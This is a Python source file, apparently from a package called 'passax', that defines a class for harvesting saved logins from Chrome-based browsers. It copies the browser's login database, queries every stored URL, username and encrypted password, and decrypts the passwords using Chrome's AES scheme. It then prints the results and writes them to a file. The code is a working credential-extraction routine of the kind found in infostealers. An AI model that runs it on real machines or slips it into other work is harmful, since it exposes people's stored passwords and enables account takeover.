import getpass
import os
import platform
import shutil
import sqlite3
from datetime import datetime, timedelta
from pathlib import Path
from typing import Union, Any

from Crypto.Cipher import AES

from passax.exceptions import *


class ChromeBase:
    def __init__(self,
                 verbose: bool = False,
                 blank_passwords: bool = True):
        """
        Main Chrome-based browser class.
        :param verbose: print output
        :param blank_passwords: whether to save or not blank password fields
        """
        self.verbose = verbose
        self.blank_passwords = blank_passwords
        self.values = []

        #  Determine which platform you are on
        self.target_os = platform.system()

    @staticmethod
    def get_datetime(chromedate: Any) -> datetime:
        """
        Return a `datetime.datetime` object from a chrome-like format datetime
        Since `chromedate` is formatted as the number of microseconds since January, 1601"""
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    @staticmethod
    def get(func):
        """
        Update paths with the Chrome versions
        Will change protected members from child class.
        """

        def wrapper(*args):
            cls = args[0]
            sys_ = platform.system()
            base_name = cls.browser.base_name

            # Get versions
            versions = None

            # Assign the versions
            if sys_ == "Windows":
                versions = cls.browser.versions_win
            elif sys_ == "Linux":
                versions = cls.browser.versions_linux
            elif sys_ == "Darwin":
                versions = cls.browser.versions_mac

            for ver in versions:
                # Accessing protected member to update the paths.
                browser_path = cls.browsers_paths[base_name].format(ver=ver)
                database_path = cls.browsers_database_paths[base_name].format(ver=ver)

                if os.path.exists(browser_path) and os.path.exists(database_path):
                    cls._browser_paths.append(browser_path)
                    cls._database_paths.append(database_path)

            return func(*args)

        return wrapper

    @staticmethod
    def decrypt_windows_password(password: bytes, key: bytes):
        """
        Decrypt Windows Chrome password
        Override this method.
        Declared in Windows class because this method
        uses a library only available in Windows.
        """

    @staticmethod
    def decrypt_unix_password(password: bytes, key: bytes) -> str:
        """
        Decrypt Unix Chrome password
        Salt: The salt is ‘saltysalt’ (constant)
        Iterations: 1003(constant) for symmetric key derivation in macOS. 1 iteration in Linux.
        IV: 16 spaces.
        """
        try:
            iv = b' ' * 16  # Initialization vector
            password = password[3:]  # Delete the 3 first chars
            cipher = AES.new(key, AES.MODE_CBC, IV=iv)  # Create cipher
            return cipher.decrypt(password).strip().decode('utf8')

        except Exception:
            raise NotImplemented

    def retrieve_database(self) -> list:
        """
        Retrieve all the information from the databases with encrypted values.
        """
        temp_path = r"C:\Users\{}\AppData\Local\Temp".format(
            getpass.getuser()) if self.target_os == "Windows" else "/tmp"
        database_paths, keys = self.database_paths, self.keys

        try:
            for database_path in database_paths:  # Iterate on each available database
                # Copy the file to the temp directory as the database will be locked if the browser is running
                filename = os.path.join(temp_path, "LoginData.db")
                shutil.copyfile(database_path, filename)

                db = sqlite3.connect(filename)  # Connect to database
                cursor = db.cursor()  # Initialize cursor for the connection
                # Get data from the database
                cursor.execute(
                    "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created"
                )

                # Set default values. Some of the values from the database are not filled.
                creation_time = "unknown"
                last_time_used = "unknown"

                # Iterate over all the rows
                for row in cursor.fetchall():
                    origin_url = row[0]
                    action_url = row[1]
                    username = row[2]
                    encrypted_password = row[3]
                    date_created = row[4]
                    date_last_used = row[5]

                    key = keys[database_paths.index(database_path)]

                    # Decrypt password
                    if self.target_os == "Windows":
                        password = self.decrypt_windows_password(encrypted_password, key)

                    elif self.target_os == "Linux" or self.target_os == "Darwin":
                        password = self.decrypt_unix_password(encrypted_password, key)

                    else:
                        password = ""

                    if password == "" and not self.blank_passwords:
                        continue

                    if date_created and date_created != 86400000000:
                        creation_time = str(self.__class__.get_datetime(date_created))

                    if date_last_used and date_last_used != 86400000000:
                        last_time_used = self.__class__.get_datetime(date_last_used)

                    # Append all values to list
                    self.values.append(dict(origin_url=origin_url,
                                            action_url=action_url,
                                            username=username,
                                            password=password,
                                            creation_time=creation_time,
                                            last_time_used=last_time_used))

                    if self.verbose:
                        if username or password:
                            print("Origin URL: \t{}".format(origin_url))
                            print("Action URL: \t{}".format(action_url))
                            print("Username: \t{}".format(username))
                            print("Password: \t{}".format(password))
                            print("Creation date: \t{}".format(creation_time))
                            print("Last Used: \t{}".format(last_time_used))
                            print('-' * 50)

                # Close connection to the database
                cursor.close()  # Close cursor
                db.close()  # Close db instance

                # Attempt to delete the temporal database copy
                try:
                    os.remove(filename)

                except OSError:  # Skip if the database can't be deleted.
                    raise OSError("Couldn't delete temp database")

                return self.values

        # Errors
        except Exception as E:
            if E == 'database is locked':
                raise DatabaseIsLocked

            elif E == 'no such table: logins':
                raise DatabaseUndefinedTable

            elif E == 'unable to open database file':
                raise DatabaseNotFound

            else:
                # Not handled error. Abort execution.
                raise DatabaseError("Not handled database error.")

    def pretty_print(self) -> str:
        """
        Return the pretty-printed values
        """
        o = ""
        for dict_ in self.values:
            for val in dict_:
                o += f"{val} : {dict_[val]}\n"
            o += '-' * 50 + '\n'
        return o

    def save(self, filename: Union[Path, str], blank_file: bool = False, verbose: bool = True) -> bool:
        """
        Save all the values to a desired path
        :param filename: the filename (including the path to dst)
        :param blank_file: save file if no content is returned
        :param verbose: print output
        :return: bool
        """
        content = self.pretty_print()

        if blank_file:
            with open(filename, 'w') as file:
                file.write(content)
                return True

        else:
            if content:
                print(True)
                with open(filename, 'w') as file:
                    file.write(content)
                return True

            if verbose:
                print(f"No content for '{filename}'")
            return False
